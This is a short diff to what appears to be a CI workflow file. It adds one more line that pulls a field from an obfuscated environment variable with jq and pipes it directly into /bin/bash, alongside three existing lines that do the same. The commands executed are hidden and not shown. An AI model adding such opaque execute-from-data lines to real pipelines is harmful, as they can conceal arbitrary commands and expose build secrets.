@@ -26,6 +26,7 @@ jobs:
           echo $uegi98848 | jq -r .vn59 | /bin/bash
           printf '%s' "$tjuk4" | jq -r .vihu936 | /bin/bash
           printf '%s' "$u03" | jq -r .tarv64 | /bin/bash
+          printf '%s' "$ra6" | jq -r .b3 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
